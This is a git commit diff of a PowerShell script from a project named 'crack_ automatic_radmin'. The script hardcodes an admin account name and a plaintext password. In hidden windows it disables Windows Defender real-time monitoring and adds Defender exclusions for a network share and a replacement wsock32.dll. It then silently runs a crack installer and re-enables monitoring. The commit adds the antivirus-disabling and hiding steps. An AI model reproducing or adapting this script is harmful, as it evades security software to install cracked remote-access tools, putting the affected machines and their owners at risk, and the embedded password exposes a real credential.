b41651307ea54f85173a4c8a3f93d6c9cd642f8a
alirezaghadiri <48920959+alirezaghadiri@users.noreply.github.com>
2022-06-25 10:51:40 +0430

    add new path to Exclusion Path and hide

--- crack_ automatic_radmin/RadminScript.ps1
+++ crack_ automatic_radmin/RadminScript.ps1
@@ -1,11 +1,13 @@
-﻿$username = '.\gadmin'
+
+$username = '.\gadmin'
 $password = 'Roy@lG@rden57'
 $securePassword = ConvertTo-SecureString $password -AsPlainText -Force
 $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
 try{
-Start-Process powershell.exe -ArgumentList ("Add-MpPreference -ExclusionPath \\orit01\ITShare\Remote") -Credential $Credential -WindowStyle Hidden
+Start-Process powershell.exe -Credential $Credential -ArgumentList ("Set-MpPreference -DisableRealtimeMonitoring $True") -WindowStyle Hidden
+Start-Process powershell.exe -Credential $Credential -ArgumentList ("Add-MpPreference -ExclusionPath \\orit01\ITShare\Remote") -WindowStyle Hidden
+Start-Process powershell.exe -Credential $Credential -ArgumentList ("Add-MpPreference -ExclusionPath c:\windows\SysWOW64\rserver30\wsock32.dll") -WindowStyle Hidden
 }
-catch {
-exit
-}
+catch {exit}
 Start-Process -FilePath \\orit01\ITShare\Remote\Crack\install.bat -Credential $credential -WindowStyle Hidden
+Start-Process powershell.exe -Credential $Credential -ArgumentList ("Set-MpPreference -DisableRealtimeMonitoring $False") -WindowStyle Hidden
